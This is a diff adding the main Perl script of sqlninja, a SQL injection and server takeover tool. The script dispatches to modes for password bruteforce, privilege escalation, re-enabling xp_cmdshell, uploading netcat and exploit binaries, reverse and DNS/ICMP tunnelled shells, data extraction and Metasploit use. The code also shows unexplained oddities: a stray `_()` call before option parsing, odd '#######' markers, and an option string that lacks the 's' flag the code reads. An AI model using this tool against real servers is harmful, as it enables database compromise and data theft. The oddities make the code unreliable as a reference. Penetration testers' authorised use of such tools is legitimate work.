@@ -1,0 +1,402 @@
+#!/usr/bin/env perl 
+
+# sqlninja - SQL injection and takeover tool
+# Copyright (C) 2006-2013
+# http://sqlninja.sourceforge.net
+# icesurfer <r00t@northernfortress.net>
+# nico <nico@leidecker.info>
+# 
+# Sqlninja is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# Sqlninja is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.
+
+# Originally developed as a highly customized sql-based exploit
+# during a pen-test for a major financial institution (ciao Maurizio!),
+# to my surprise it became a more general purpose injection tool. Bah.
+
+# While I am releasing this version, my Gentoo box is playing:
+# Metallica - Breadfan
+
+use strict;
+use Config;
+use IO::Socket;
+use IO::Handle;
+use Getopt::Std;
+use Fcntl;
+
+# TODO: need to check dependency for this one? (nico)
+# icesurfer: we should check only if $conf->session == 1, but the checks are done after the conf file is parsed
+use DBI;
+
+require "lib/utils.pl";
+require "lib/session.pl";
+require "lib/fingerprint.pl";
+require "lib/bruteforce.pl";
+require "lib/escalation.pl";
+require "lib/upload.pl";
+require "lib/dirshell.pl";
+require "lib/revshell.pl";
+require "lib/backscan.pl";
+require "lib/dns.pl";
+require "lib/icmp.pl";
+require "lib/metasploit.pl";
+require "lib/test.pl";
+require "lib/sqlcmd.pl";
+require "lib/resurrectxp.pl";
+require "lib/getdata.pl";        #######
+
+# Process command line arguments
+my %options;
+my $ask;_();getopts('gvm:f:p:w:u:d:',\%options) or usage();
+
+our $conf = {}; # hash reference
+
+# version of this sqlninja release
+$conf->{'RELEASE'} = "0.2.999-alpha1";
+
+$conf->{'host'} = "";
+$conf->{'port'} = "";
+$conf->{'proxyhost'} = "";
+$conf->{'proxyport'} = "8080";
+$conf->{'httprequest'} = ""; # This substitutes a bunch of variables of previous versions
+$conf->{'method'}; # GET or POST
+$conf->{'vhost'} = ""; 
+$conf->{'postline'};        #######
+$conf->{'httpversion'} = 0;
+$conf->{'filterconf'} = "";
+$conf->{'timeout'} = 5;
+$conf->{'ssl'} = "";
+$conf->{'lhost'} = "";
+$conf->{'dev'} = "eth0";
+$conf->{'domain'};
+$conf->{'hostnamelen'} = 250;
+$conf->{'resolvedip'} = "127.0.0.1";
+$conf->{'xp_name'} = "xp_cmdshell";
+$conf->{'evasion'} = "0";
+$conf->{'genscript'} = "";
+$conf->{'mode'} = $options{m};
+$conf->{'verbose'} = $options{v};
+$conf->{'confile'} = $options{f} || "sqlninja.conf";
+$conf->{'password'} = $options{p} || "";
+$conf->{'wordlist'} = $options{w};
+$conf->{'user'} = $options{u};        #######
+$conf->{'debug'} = $options{d};
+$conf->{'genscript'} = $options{g};
+$conf->{'session_file'} = $options{s} || "session.db";
+$conf->{'errorstring'} = "";
+$conf->{'appendcomment'} = "--";
+$conf->{'msfpath'} = "";
+$conf->{'msfencoder'} = "";
+$conf->{'msfencodecount'} = 5;
+$conf->{'lines_per_req'} = 10; # script lines to upload with each request
+$conf->{'churrasco'} = 0;
+$conf->{'checkdep'} = "no";
+$conf->{'sqlmarker'} = "__SQL2INJECT__";
+$conf->{'uploaddir'} = "\%TEMP\%";
+$conf->{'uploadmethod'} = "vbscript";
+$conf->{'vbsdecoder'} = "b64decoder.vbs";
+
+$conf->{'extractionchannel'} = "time"; # possible values: time and dns
+$conf->{'extractiontype'} = 'serial_optimized'; # possible values: serial, serial_optimized, binary
+$conf->{'language_map'} = 'lib/langs/en.map';
+$conf->{'language_map_adaptive'} = 1;
+$conf->{'blindtime'} = 5;
+$conf->{'dnschars'} = 25; # Chars to convert to the hostname in DNS-data-extraction
+			   # Does not include counter (currently 1 char). 
+			   # NOTE: 2x$conf->{'dnschars'}+len(counter)+1 < 64 (RFC)
+$conf->{'dnscountermodulo'} = 1000000;
+$conf->{'store_session'} = 1;
+$conf->{'sanity_check'} = 1;
+$conf->{'refresh_session'} = 1;
+
+# check that all module dependencies are met
+check_dependencies();
+
+# Silly birthday function...
+birthday_alert();
+
+# show banner
+banner();
+
+# Parse configuration file
+parsefile();
+
+# make sure everything is put in place according to the parsed configuration
+fix_configuration_dependencies();
+
+# open the session
+session_open();
+
+# configure and run operation mode
+run_operation_mode();
+
+exit(0);
+
+
+sub run_operation_mode {
+
+	if (	$conf->{'mode'} ne "test" && $conf->{'mode'} ne "t" &&
+		$conf->{'mode'} ne "fingerprint" && $conf->{'mode'} ne "f" &&
+		$conf->{'mode'} ne "bruteforce" && $conf->{'mode'} ne "b" &&
+		$conf->{'mode'} ne "escalation" && $conf->{'mode'} ne "e" &&
+		$conf->{'mode'} ne "resurrectxp" && $conf->{'mode'} ne "x" &&
+		$conf->{'mode'} ne "upload" && $conf->{'mode'} ne "u" &&
+		$conf->{'mode'} ne "dirshell" && $conf->{'mode'} ne "s" &&
+		$conf->{'mode'} ne "backscan" && $conf->{'mode'} ne "k" &&
+		$conf->{'mode'} ne "revshell" && $conf->{'mode'} ne "r" &&
+		$conf->{'mode'} ne "dnscmd" && $conf->{'mode'} ne "d" &&
+		$conf->{'mode'} ne "icmpshell" && $conf->{'mode'} ne "i" &&
+		$conf->{'mode'} ne "sqlcmd" && $conf->{'mode'} ne "c" &&
+	        $conf->{'mode'} ne "getdata" && $conf->{'mode'} ne "g" &&
+		$conf->{'mode'} ne "metasploit" && $conf->{'mode'} ne "m") {
+				usage();
+				exit(1);
+		}
+
+	if ((($conf->{'mode'} eq "k") or ($conf->{'mode'} eq "backscan")) and ($> != 0)) {
+		print "You need r00t privileges to run backscan mode...\n";
+		exit(0);
+	}
+
+	if ((($conf->{'mode'} eq "d") or ($conf->{'mode'} eq "dnstunnel")) and ($> != 0)) {
+		print "You need r00t privileges to run dnstunnel mode...\n";
+		exit(0);
+	}
+
+	if ((($conf->{'mode'} eq "i") or ($conf->{'mode'} eq "icmpshell")) and ($> != 0)) {
+		print "You need r00t privileges to run icmpshell...\n";
+		exit(0);
+	}
+
+	if (($conf->{'genscript'} == 1) and ($conf->{'mode'} ne "upload") and ($conf->{'mode'} ne "u")) {
+		print "[-] -g only works with upload mode. Ignoring it...\n";
+	}
+
+	if (($conf->{'debug'} ne "") and
+	    ($conf->{'debug'} ne "1") and
+	    ($conf->{'debug'} ne "2") and
+	    ($conf->{'debug'} ne "3") and
+	    ($conf->{'debug'} ne "all")) {
+	    	print "Unrecognized debug mode. Possible modes are:\n".
+		      " 1 - Print injected SQL command\n".
+		      " 2 - Print raw HTTP request\n".
+		      " 3 - Print raw HTTP response\n".
+		      " all - all of the above\n\n";
+		exit(0);
+	}
+
+
+	if ((($conf->{'mode'} eq "g") or ($conf->{'mode'} eq "getdata")) and ($conf->{'extractionchannel'} eq "dns") and ($> != 0)) {
+		print "You need r00t privileges to extract data via a DNS tunnel...\n";
+		exit(0);
+	}
+
+
+	# What should we do anyway ?
+	print "[+] Target is: ".$conf->{'host'}.":".$conf->{'port'}."\n";
+	if (($conf->{'mode'} eq "test") || ($conf->{'mode'} eq "t")) {
+		test();
+	} elsif (($conf->{'mode'} eq "fingerprint") || ($conf->{'mode'} eq "f")) {
+		fingerprint();
+	} elsif (($conf->{'mode'} eq "bruteforce") || ($conf->{'mode'} eq "b")) {
+		if ($conf->{'$password'} ne "") {
+			print "[-] bruteforce mode specified. Password will be ".
+			              "ignored\n";
+			$conf->{'password'} = "";
+		}
+		brute();
+	} elsif (($conf->{'mode'} eq "escalation") || ($conf->{'mode'} eq "e")) {
+		if ($conf->{'password'} eq "") {
+			print "[-] password not specified... exiting\n";
+			exit(1);
+		}
+		if ($conf->{'user'} ne "") {
+			print "[-] username is not needed from version 0.2.0\n";
+		}
+		escalation();
+	} elsif (($conf->{'mode'} eq "resurrectxp") || ($conf->{'mode'} eq "x")) {
+		if ($conf->{'xp_name'} eq "NULL") {
+			print "[-] xp_name can't be NULL to use this mode. Please upd".
+			      "ate conf file\n";
+			exit(0);
+		}
+	        resurrectxp();
+	} elsif (($conf->{'mode'} eq "upload") || ($conf->{'mode'} eq "u")) {
+		my $uplfile;
+		while ($uplfile eq "") {
+			print "  Specify the binary or script file to upload\n";
+			print "  shortcuts:\n".
+			      "    1: apps/nc.exe\n".
+			      "    2: apps/dnstun.exe\n".
+			      "    3: apps/churrasco.exe\n".
+			      "    4: apps/icmpsh.exe\n".
+			      "    5: apps/vdmallowed.exe\n".
+			      "    6: apps/vdmexploit.dll\n".
+			      "  > ";
+			$uplfile = <STDIN>;
+			chomp $uplfile;
+			if ($uplfile eq "1") {
+				$uplfile = "apps/nc.exe";
+			} elsif ($uplfile eq "2") {
+				$uplfile = "apps/dnstun.exe";
+			} elsif ($uplfile eq "3") {
+				$uplfile = "apps/churrasco.exe";
+			} elsif ($uplfile eq "4") {
+				$uplfile = "apps/icmpsh.exe";
+			} elsif ($uplfile eq "5") {
+				$uplfile = "apps/vdmallowed.exe";
+			} elsif ($uplfile eq "6") {
+				$uplfile = "apps/vdmexploit.dll";
+			}
+		}
+		upload($uplfile);
+	} elsif (($conf->{'mode'} eq "dirshell") || ($conf->{'mode'} eq "s")) {
+		dirshell();
+	} elsif (($conf->{'mode'} eq "backscan") || ($conf->{'mode'} eq "k")) {
+		backscan();
+	} elsif (($conf->{'mode'} eq "revshell") || ($conf->{'mode'} eq "r")) {
+		revshell();
+	} elsif (($conf->{'mode'} eq "dnscmd") || ($conf->{'mode'} eq "d")) {
+		if ($conf->{'domain'} eq "") {
+			print "[-] domain has not been specified... exiting\n";
+			exit(1);
+		}
+		dnscmd();
+	} elsif (($conf->{'mode'} eq "icmpshell") || ($conf->{'mode'} eq "i")) {
+		icmpshell();
+	} elsif (($conf->{'mode'} eq "sqlcmd") || ($conf->{'mode'} eq "c")) {
+	        sqlcmd();
+	} elsif (($conf->{'mode'} eq "metasploit") || ($conf->{'mode'} eq "m")) {
+		metasploit();
+	} elsif (($conf->{'mode'} eq "getdata") || ($conf->{'mode'} eq "g")) {
+		getdata();
+	}
+}
+
+sub fix_configuration_dependencies
+{
+
+	my $extract_module = 'lib/getdata_time.pl';
+	# chose which module to load
+	if ($conf->{'extractionchannel'} eq "dns") {
+		$extract_module = 'lib/getdata_dns.pl';
+	}
+	# Specifying a session file overrides the conf file setting
+	if ($options{s} and ($conf->{'store_session'} == 0)) {
+		$conf->{'store_session'} = 1;
+	}
+
+	print "[+] Loading extraction module: $extract_module\n";
+	require $extract_module;
+
+	if (($conf->{'xp_name'} eq "NULL") and ($conf->{'password'} eq "")) {
+		print "You need to specify the sa password when xp_name is NULL !\n";
+		exit(0);
+	}
+
+	# Children either signal when they are done via socket 
+	# or they are killed by the parent
+	$SIG{CHLD} = 'IGNORE';
+
+	# Check whether to use SSL or not
+	if ($conf->{'ssl'} eq "auto") {
+		if ($conf->{'proxyhost'} eq "") {
+			checkSSL();
+		} else {
+			print "[-] ssl can't be set to auto when using a proxy.\n";
+			if ($conf->{'port'} eq "443") {
+				print "    Assuming encrypted connection\n";
+				$conf->{'ssl'} = 1;
+			} else {
+				print "    Assuming cleartext connection\n";
+				$conf->{'ssl'} = 0;
+			}
+		}	      
+	} elsif ($conf->{'ssl'} eq "yes") {
+		if ($conf->{'verbose'} == 1) {
+			print "[v] Using SSL connection\n";
+		}
+		$conf->{'ssl'} = 1;
+	} elsif ($conf->{'ssl'} eq "no") {
+		if ($conf->{'verbose'} == 1) {
+			print "[v] Using cleartext connection\n";
+		}
+		$conf->{'ssl'} = 0;
+	# If we are here, it means that ssl wasn't specified at all. So we guess
+	} elsif ($conf->{'port'} eq "443") {
+		print "[+] Port 443... assuming SSL\n";
+		$conf->{'ssl'} = 1;
+	} else {
+		print "[+] Port ".$conf->{'port'}.". Assuming cleartext\n";
+		$conf->{'ssl'} = 0;
+	}
+}
+
+
+sub check_dependencies {
+	# Provide a friendly message for missing modules...
+	my %nonStandardModules = (
+			"NetPacket-IP"             => "NetPacket::IP",
+			"NetPacket-TCP"            => "NetPacket::TCP",
+			"NetPacket-UDP"            => "NetPacket::UDP",
+			"NetPacket-ICMP"	   => "NetPacket::ICMP",
+			"IO-Socket-SSL"            => "IO::Socket::SSL",
+			"Net-Pcap"                 => "Net::Pcap",
+			"Net-RawIP"		   => "Net::RawIP",
+			"Net-DNS-Nameserver"	   => "Net::DNS::Nameserver",
+			"MIME-Base64"		   => "MIME::Base64",
+	);
+
+
+
+	while(my ($name,$module) = each %nonStandardModules) {
+		if (($> != 0) and ($name eq "Net-Pcap")) {
+			next;
+		}
+		if (($> != 0) and ($name eq "Net-DNS-Nameserver")) {
+			next;
+		}
+		if (($> != 0) and ($name eq "Net-RawIP")) {
+			next;
+		}
+		eval "use $module";
+		# The module isn't there
+		if ($@ =~ /Can't locate/) {
+			die "\nSeems that some module is missing...:\n".$@."\n";
+		}
+		if (($@ ne "") and ($conf->{'verbose'} == 1)) {
+			print $@;
+		}
+	}
+}
+
+sub birthday_alert
+{
+	# Silly birthday function...
+	my @timedata = localtime(time);
+	if (($timedata[3] == 26) and ($timedata[4] == 0)) {
+		printf "-----------------------------------------------------------\n";
+		printf "Today is icesurfer's bday. What about a greetings email? :)\n";
+		printf "-----------------------------------------------------------\n";
+	} elsif (($timedata[3] == 8) and ($timedata[4] == 1)) {
+		printf "----------------------------------------------------------\n";
+		printf "Today is sqlninja's bday. What about a greetings email? :)\n";
+		printf "----------------------------------------------------------\n";
+	}
+}
+
+sub banner()
+{
+	print("Sqlninja rel. ".$conf->{'RELEASE'}." <http://sqlninja.sf.net>\n");
+	print("(C) 2006-2013 icesurfer & nico\n");	
+}
+
